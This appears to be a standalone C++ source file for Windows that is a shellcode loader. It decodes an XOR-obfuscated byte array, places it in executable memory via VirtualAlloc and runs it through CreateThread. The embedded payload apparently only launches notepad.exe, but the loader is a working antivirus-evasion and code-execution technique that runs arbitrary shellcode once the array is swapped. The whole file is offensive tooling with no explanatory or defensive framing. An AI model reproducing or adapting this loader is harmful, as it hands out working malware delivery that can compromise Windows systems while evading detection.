#include <iostream>
#include <sstream>
#include <iomanip>
#include <cstdlib>
#include <string>
#include <cstring>
#include <windows.h> // For Windows API functions

std::string byte_to_hex_string(unsigned char byte) {
    std::stringstream ss;
    ss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);
    return ss.str();
}

std::string decode_shellcode(unsigned char *encrypted_shellcode, size_t length, unsigned char key) {
    std::string decoded_shellcode_str;
    decoded_shellcode_str.reserve(length); // Reserve space for the decoded bytes

    for (size_t i = 0; i < length; i++) {
        unsigned char decoded_byte = encrypted_shellcode[i] ^ key;
        decoded_shellcode_str += decoded_byte; // Store raw bytes
    }

    return decoded_shellcode_str;
}

std::string test123() {
    unsigned char encrypted_shellcode[] = {
        // Your encrypted shellcode bytes here
        0x56, 0x42, 0x28, 0xaa, 0xaa, 0xaa, 0xca, 0x23, 0x4f, 0x9b, 0x6a, 0xce, 0x21, 0xfa, 0x9a, 0x21,
        0xf8, 0xa6, 0x21, 0xf8, 0xbe, 0x21, 0xd8, 0x82, 0xa5, 0x1d, 0xe0, 0x8c, 0x9b, 0x55, 0x06, 0x96,
        0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0x6b, 0x65, 0xa7, 0xab, 0x6d, 0x48, 0x58, 0xf8, 0xfd, 0x21, 0xf8,
        0xba, 0x21, 0xe0, 0x96, 0x21, 0xe6, 0xbb, 0xd2, 0x49, 0xe2, 0xab, 0x7b, 0xfb, 0x21, 0xf3, 0x8a,
        0xab, 0x79, 0x21, 0xe3, 0xb2, 0x49, 0x90, 0xe3, 0x21, 0x9e, 0x21, 0xab, 0x7c, 0x9b, 0x55, 0x06,
        0x6b, 0x65, 0xa7, 0xab, 0x6d, 0x92, 0x4a, 0xdf, 0x5c, 0xa9, 0xd7, 0x52, 0x91, 0xd7, 0x8e, 0xdf,
        0x4e, 0xf2, 0x21, 0xf2, 0x8e, 0xab, 0x79, 0xcc, 0x21, 0xa6, 0xe1, 0x21, 0xf2, 0xb6, 0xab, 0x79,
        0x21, 0xae, 0x21, 0xab, 0x7a, 0x23, 0xee, 0x8e, 0x8e, 0xf1, 0xf1, 0xcb, 0xf3, 0xf0, 0xfb, 0x55,
        0x4a, 0xf5, 0xf5, 0xf0, 0x21, 0xb8, 0x41, 0x27, 0xf7, 0xc0, 0xab, 0x27, 0x2f, 0x18, 0xaa, 0xaa,
        0xaa, 0xfa, 0xc2, 0x9b, 0x21, 0xc5, 0x2d, 0x55, 0x7f, 0x11, 0x5a, 0x1f, 0x08, 0xfc, 0xc2, 0x0c,
        0x3f, 0x17, 0x37, 0x55, 0x7f, 0x96, 0xac, 0xd6, 0xa0, 0x2a, 0x51, 0x4a, 0xdf, 0xaf, 0x11, 0xed,
        0xb9, 0xd8, 0xc5, 0xc0, 0xaa, 0xf9, 0x55, 0x7f, 0xc4, 0xc5, 0xde, 0xcf, 0xda, 0xcb, 0xce, 0x84,
        0xcf, 0xd2, 0xcf, 0xaa
        // ...
    };
    size_t length = sizeof(encrypted_shellcode) / sizeof(encrypted_shellcode[0]);
    unsigned char key = 0xAA;

    // Decode and get shellcode as raw bytes
    std::string decoded_shellcode_str = decode_shellcode(encrypted_shellcode, length, key);

    // Return the decoded shellcode as raw bytes
    return decoded_shellcode_str;
}

int main() {
    std::string decoded_shellcode = test123();
    std::cout << decoded_shellcode;
    // Allocate memory for the shellcode
    void* exec_mem = VirtualAlloc(NULL, decoded_shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == nullptr) {
        std::cerr << "Failed to allocate memory" << std::endl;
        return EXIT_FAILURE;
    }

    // Copy the decoded shellcode into the allocated memory
    std::memcpy(exec_mem, decoded_shellcode.data(), decoded_shellcode.size());

    // Print memory addresses for debugging
    std::cout << "[!] shellcode variable address : 0x" << std::hex << reinterpret_cast<std::uintptr_t>(&decoded_shellcode) << std::endl;
    std::cout << "[!] memory address of exec_mem region : 0x" << std::hex << reinterpret_cast<std::uintptr_t>(exec_mem) << std::endl;

    // Execute the shellcode
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);

    // Sleep to allow shellcode to execute
    Sleep(1000);

    // Free allocated memory
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}